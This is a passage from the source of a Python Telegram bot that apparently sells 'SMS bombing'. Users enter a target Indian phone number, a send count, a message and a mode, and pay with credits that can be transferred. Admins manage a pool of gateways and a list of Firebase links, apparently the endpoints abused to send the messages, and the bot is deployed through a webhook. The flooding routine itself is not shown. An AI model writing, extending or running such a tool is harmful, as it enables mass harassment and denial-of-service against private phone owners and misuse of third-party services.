                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_broadcast':
            if not is_owner(user_id): return
            state[user_id] = {'step': 'own_broadcast'}
            await edit('📢 *broadcast*\n\nsend the message:', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return
        if data == 'own_gwhealth':
            if not is_owner(user_id): return
            cur.execute('SELECT * FROM gateway_health')
            rows = cur.fetchall()
            txt = '\n'.join(f'{"🟢" if r["alive"] else "🔴"} `{r["name"]}`' for r in rows)
            await edit(f'⚙️ *gateway health*\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([
                           [InlineKeyboardButton('🔄 Re-check', callback_data='own_recheck')],
                           [InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_recheck':
            if not is_owner(user_id): return
            await check_gateway_health()
            await edit(f'✅ re-checked. live: *{len(live_gateways())}/{len(GATEWAY_POOL)}*', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
        if data == 'own_fblist':
            if not is_owner(user_id): return
            cur.execute('SELECT * FROM firebase_links')
            rows = cur.fetchall()
            txt = '\n'.join(f'{"🟢" if r["active"] else "🔴"} {i+1}. `{r["url"]}`' for i, r in enumerate(rows)) or 'none'
            await edit(f'🔥 *all firebase links*\n\n{txt}', parse_mode='Markdown',
                       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='menu_owner')]]))
            return
    except Exception as e:
        print(f'[cb error] {e}')

async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return
    user_id = msg.from_user.id
    chat_id = msg.chat_id
    text = msg.text.strip()
    touch_user(user_id)

    st = state.get(user_id)
    if not st:
        return

    step = st.get('step')

    try:
        if step == 'bomb_phone':
            phone = valid_indian(text)
            if not phone:
                await msg.reply_text('❌ invalid indian number. send 10 digits starting 6-9.')
                return
            st['phone'] = phone
            st['step'] = 'bomb_amount'
            state[user_id] = st
            await msg.reply_text(f'target: `{phone}`\n\nhow many sends?',
                                 parse_mode='Markdown', reply_markup=kb_bomb_amount())
            return

        if step == 'bomb_message':
            if len(text) > 300:
                text = text[:300]
            st['message'] = text
            st['step'] = 'bomb_mode'
            state[user_id] = st
            await msg.reply_text(f'target: `{st["phone"]}`\namount: *{st["amount"]}*\nmessage: `{text}`\n\nchoose mode:',
                                 parse_mode='Markdown', reply_markup=kb_bomb_mode())
            return

        if step == 'transfer_target':
            try:
                target = int(text)
            except ValueError:
                await msg.reply_text('❌ invalid ID.')
                return
            if not get_user(target):
                await msg.reply_text('❌ user not found.')
                return
            if target == user_id:
                await msg.reply_text("❌ can't transfer to yourself.")
                return
            st['target'] = target
            st['step'] = 'transfer_amount'
            state[user_id] = st
            await msg.reply_text('send amount to transfer:',
                                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='cancel')]]))
            return

        if step == 'transfer_amount':
            try:
                amount = float(text)
            except ValueError:
                await msg.reply_text('❌ invalid amount.')
                return
            u = get_user(user_id)
            if amount <= 0:
                await msg.reply_text('❌ invalid amount.')
                return
            if u['credits'] < amount:
                await msg.reply_text('❌ not enough credits.')
                return
            sub_credits(user_id, amount, 'transfer_out', f'to {st["target"]}')
            add_credits(st['target'], amount, 'transfer_in', f'from {user_id}')
            state.pop(user_id, None)
            await msg.reply_text(f'✅ transferred *{amount}* credits to `{st["target"]}`',
                                 parse_mode='Markdown', reply_markup=kb_main())
            return

        if step in ('adm_addcredit', 'adm_remcredit'):
            if not is_admin(user_id):
                state.pop(user_id, None)
                return
            parts = text.split()
            if len(parts) != 2:
                await msg.reply_text('❌ format: `user_id amount`', parse_mode='Markdown')
                return
            try:
                target = int(parts[0]); amount = float(parts[1])
            except ValueError:
                await msg.reply_text('❌ invalid format.')
                return
            if not get_user(target):
                await msg.reply_text('❌ target user not found.')
                return
            if step == 'adm_addcredit':
                add_credits(target, amount, 'admin_add', f'by {user_id}')
                sign = '+'
            else:
                sub_credits(target, amount, 'admin_rem', f'by {user_id}')
                sign = '-'
            state.pop(user_id, None)
            await msg.reply_text(f'✅ {sign}{amount} to `{target}`. new balance: *{get_user(target)["credits"]}*',
                                 parse_mode='Markdown', reply_markup=kb_admin())
            return

        if step == 'adm_addfb':
            if not is_admin(user_id):
                state.pop(user_id, None)
                return
            if not text.startswith('http'):
                await msg.reply_text('❌ send a valid URL.')
                return
            cur.execute('INSERT OR IGNORE INTO firebase_links (url, added_by, added_at) VALUES (?,?,?)',
                        (text, user_id, now()))
            db.commit()
            state.pop(user_id, None)
            await msg.reply_text(f'✅ firebase added:\n`{text}`', parse_mode='Markdown', reply_markup=kb_admin())
            return

        if step == 'adm_remfb':
            if not is_admin(user_id):
                state.pop(user_id, None)
                return
            cur.execute('UPDATE firebase_links SET active = 0 WHERE url = ?', (text,))
            db.commit()
            state.pop(user_id, None)
            await msg.reply_text(f'✅ firebase removed:\n`{text}`', parse_mode='Markdown', reply_markup=kb_admin())
            return

        if step == 'own_addadm':
            if not is_owner(user_id):
                state.pop(user_id, None)
                return
            try:
                target = int(text)
            except ValueError:
                await msg.reply_text('❌ invalid ID.')
                return
            cur.execute('INSERT OR IGNORE INTO admins (user_id, added_by, added_at) VALUES (?,?,?)',
                        (target, user_id, now()))
            db.commit()
            state.pop(user_id, None)
            await msg.reply_text(f'✅ added admin: `{target}`', parse_mode='Markdown', reply_markup=kb_owner())
            return

        if step == 'own_remadm':
            if not is_owner(user_id):
                state.pop(user_id, None)
                return
            try:
                target = int(text)
            except ValueError:
                await msg.reply_text('❌ invalid ID.')
                return
            if target == OWNER_ID:
                await msg.reply_text("❌ can't remove owner.")
                return
            cur.execute('DELETE FROM admins WHERE user_id = ?', (target,))
            db.commit()
            state.pop(user_id, None)
            await msg.reply_text(f'✅ removed admin: `{target}`', parse_mode='Markdown', reply_markup=kb_owner())
            return

        if step == 'own_broadcast':
            if not is_owner(user_id):
                state.pop(user_id, None)
                return
            cur.execute('SELECT user_id FROM users')
            users = cur.fetchall()
            ok = 0; fail = 0
            for u in users:
                try:
                    await context.bot.send_message(u['user_id'], f'📢 *broadcast*\n\n{text}', parse_mode='Markdown')
                    ok += 1
                except Exception:
                    fail += 1
                await asyncio.sleep(0.06)
            state.pop(user_id, None)
            await msg.reply_text(f'📢 broadcast done. ok: {ok}, failed: {fail}', reply_markup=kb_owner())
            return
    except Exception as e:
        print(f'[msg error] {e}')

# ============================================================
# BOOT — webhook mode for render
# ============================================================

async def post_init(app: Application):
    try:
        if OWNER_USERNAME:
            try:
                chat = await app.bot.get_chat(OWNER_USERNAME)
                print(f'[owner-username] {OWNER_USERNAME} -> {chat.id}')
            except Exception as e:
                print(f'[owner-username] resolve failed: {e}')
        if OWNER_ID:
            cur.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,))
            db.commit()
            print(f'[owner] id set: {OWNER_ID}')
        print('🤖 checking gateway health...')
        await check_gateway_health()
        print('✅ gateway check done.')
    except Exception as e:
        print(f'[post_init error] {e}')

async def health(request):
    return web.Response(text='ok')

async def telegram_webhook(request):
    try:
        data = await request.json()
        update = Update.de_json(data, app_bot)
        await app_instance.update_queue.put(update)
        return web.Response(text='ok')
    except Exception as e:
        print(f'[webhook error] {e}')
        return web.Response(text='error', status=500)

async def health_loop(app):
    while True:
        await asyncio.sleep(1800)
        try:
            await check_gateway_health()
        except Exception as e:
            print(f'[health error] {e}')

async def main():
    global app_bot, app_instance
    logging.basicConfig(level=logging.WARNING)
    print('🚀 starting bot (webhook mode)...')
    print(f'[config] RENDER_URL={RENDER_URL or "unset"} PORT={PORT} OWNER_ID={OWNER_ID}')

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    app_bot = app.bot
    app_instance = app

    app.add_handler(CommandHandler('start', cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    await app.initialize()
    await app.start()

    if RENDER_URL:
        webhook_url = f'{RENDER_URL}/{BOT_TOKEN}'
        await app.bot.set_webhook(webhook_url)
        print(f'[webhook] set: {webhook_url}')
    else:
        print('[webhook] RENDER_URL not set — set env var.')
        return

    web_app = web.Application()
    web_app.router.add_get('/', health)
    web_app.router.add_post(f'/{BOT_TOKEN}', telegram_webhook)

    runner = web.AppRunner(web_app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    print(f'✅ webhook server on 0.0.0.0:{PORT}')

    asyncio.create_task(health_loop(app))
    await asyncio.Event().wait()

if __name__ == '__main__':
    asyncio.run(main())
